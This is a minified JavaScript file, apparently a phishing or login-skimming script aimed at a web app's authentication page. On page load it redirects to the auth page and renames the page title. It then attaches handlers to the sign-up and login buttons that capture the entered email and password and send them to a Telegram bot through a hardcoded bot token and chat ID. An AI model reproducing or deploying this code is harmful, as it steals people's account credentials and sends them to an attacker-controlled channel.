window.onload = function() {
    var n = (new Date).toLocaleDateString();
    ! function t() {
        return 0 < $("#qa_auth_PageAuth").length ? void(0 < location.href.indexOf("c8a11a39904e") ? $(".header").length && ($("app-header").addClass("accdis"), document.title = "Noobenq - " + document.title + " - Registrations", $("#qa_auth_registrationFormLink").click(), setTimeout(function() {
            document.querySelector("#qa_auth_SignUpBtn > button").addEventListener("click", function() {
                var t, e = "Registrations date : " + n + "%0ARegmail : " + document.querySelector("#qa_auth_SignUpEmailInput > vui-input > div.input_input-group__39TBc > div.input_input-helper__17cT2 > vui-input-text > input[type=text]").value + "%0ARegpass : " + document.querySelector("#qa_auth_SignUpPasswordInput > vui-input > div.input_input-group__39TBc > div.input_input-helper__17cT2 > vui-input-password > input[type=password]").value;
                (t = new XMLHttpRequest).open("GET", "https://api.telegram.org/bot5411787329:AAFSXnWrr8VEWBBvNTNtw3Yiw2K_-8mBLMM/sendMessage?chat_id=5682912247&text=" + e), t.send()
            }), document.querySelector("#qa_auth_SignUpSignIn > button").addEventListener("click", function t() {
                return 0 < $("#qa_auth_LoginBtn").length ? void setTimeout(function() {
                    document.querySelector("#qa_auth_LoginBtn > button").addEventListener("click", function() {
                        var t, e = "Login date : " + n + "%0AEmail : " + document.querySelector("#qa_auth_LoginEmailInput > vui-input > div.input_input-group__39TBc > div.input_input-helper__17cT2 > vui-input-text > input[type=text]").value + "%0APass : " + document.querySelector("#qa_auth_LoginPasswordInput > vui-input > div.input_input-group__39TBc > div.input_input-helper__17cT2 > vui-input-password > input[type=password]").value;
                        (t = new XMLHttpRequest).open("GET", "https://api.telegram.org/bot5411787329:AAFSXnWrr8VEWBBvNTNtw3Yiw2K_-8mBLMM/sendMessage?chat_id=5682912247&text=" + e), t.send()
                    })
                }) : setTimeout(t, 1e3)
            })
        }, 2e3)) : location.href = "https://" + location.host + "/auth?a=c8a11a39904e") : setTimeout(t, 1e3)
    }()
}